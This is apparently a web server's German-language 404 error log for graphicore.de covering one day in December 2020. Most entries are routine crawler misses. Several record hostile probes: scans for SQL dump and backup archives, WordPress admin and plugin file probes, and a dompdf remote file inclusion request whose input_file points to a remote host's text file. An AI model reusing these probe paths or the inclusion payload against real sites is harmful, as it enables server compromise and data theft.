2020-12-26T01:01:08+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 13.66.139.69
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(11) "sitemap.xml"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2020-12-26T01:01:56+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 13.66.139.110
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(17) "sitemap_index.xml"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2020-12-26T02:04:12+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 13.66.139.69
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(11) "sitemap.xml"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2020-12-26T02:04:53+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 13.66.139.110
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(17) "sitemap_index.xml"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2020-12-26T06:04:42+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 13.66.139.69
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(11) "sitemap.xml"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2020-12-26T06:31:15+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 116.203.201.178
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(12) "dump.sql.zip"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2020-12-26T06:31:20+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 116.203.201.178
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(14) "backup.sql.zip"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2020-12-26T06:37:08+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 192.71.142.35
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(10) "humans.txt"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2020-12-26T06:37:08+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 192.71.142.35
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(7) "ads.txt"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2020-12-26T07:14:59+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 13.66.139.69
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(17) "sitemap_index.xml"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2020-12-26T10:32:54+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 13.66.139.114
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(14) "sitemap.xml.gz"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2020-12-26T11:35:09+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 47.89.242.193
HTTP_REFERER: http://graphicore.de/includes/dompdf/dompdf.php?base_path=%2f&input_file=http:%2f%2f195.110.124.236%2fsiti_editing%2fl.txt
requested: array(5) {
  ["controller"] => string(8) "includes"
  ["action"] => string(6) "dompdf"
  ["module"] => string(7) "default"
  ["base_path"] => string(1) "/"
  ["input_file"] => string(41) "http://195.110.124.236/siti_editing/l.txt"
}


--------------------------------------------------------------------------------
2020-12-26T12:35:06+00:00 ERR (3) 404 "competences" was not found.
REMOTE_ADDR: 62.210.143.6
HTTP_REFERER: 
requested: array(5) {
  ["lang"] => string(2) "en"
  ["action"] => string(4) "page"
  ["key"] => string(11) "competences"
  ["module"] => string(7) "default"
  ["controller"] => string(5) "index"
}


--------------------------------------------------------------------------------
2020-12-26T12:36:54+00:00 ERR (3) 404 "competences" was not found.
REMOTE_ADDR: 62.210.143.6
HTTP_REFERER: 
requested: array(5) {
  ["lang"] => string(2) "de"
  ["action"] => string(4) "page"
  ["key"] => string(11) "competences"
  ["module"] => string(7) "default"
  ["controller"] => string(5) "index"
}


--------------------------------------------------------------------------------
2020-12-26T13:42:53+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 199.188.201.127
HTTP_REFERER: http://graphicore.de/
requested: array(3) {
  ["controller"] => string(6) "backup"
  ["action"] => string(8) "wp-admin"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2020-12-26T13:43:29+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 13.66.139.110
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(14) "sitemap.xml.gz"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2020-12-26T19:01:29+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 13.66.139.110
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(17) "sitemap_index.xml"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2020-12-26T21:27:56+00:00 ERR (3) 404 "competences" was not found.
REMOTE_ADDR: 66.249.76.47
HTTP_REFERER: 
requested: array(5) {
  ["lang"] => string(2) "de"
  ["action"] => string(4) "page"
  ["key"] => string(11) "competences"
  ["module"] => string(7) "default"
  ["controller"] => string(5) "index"
}


--------------------------------------------------------------------------------
2020-12-26T22:03:20+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 51.145.37.111
HTTP_REFERER: 
requested: array(5) {
  ["controller"] => string(10) "wp-content"
  ["action"] => string(7) "plugins"
  ["wp-engine-module"] => string(13) "wp-engine.php"
  ["module"] => string(7) "default"
  ["filename"] => string(12) "wp-fixer.php"
}


--------------------------------------------------------------------------------
2020-12-26T22:03:23+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 51.145.37.111
HTTP_REFERER: 
requested: array(4) {
  ["controller"] => string(10) "wp-content"
  ["action"] => string(7) "plugins"
  ["wp-engine-module"] => string(12) "wp-fixer.php"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2020-12-26T22:25:49+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 13.66.139.110
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(17) "sitemap_index.xml"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
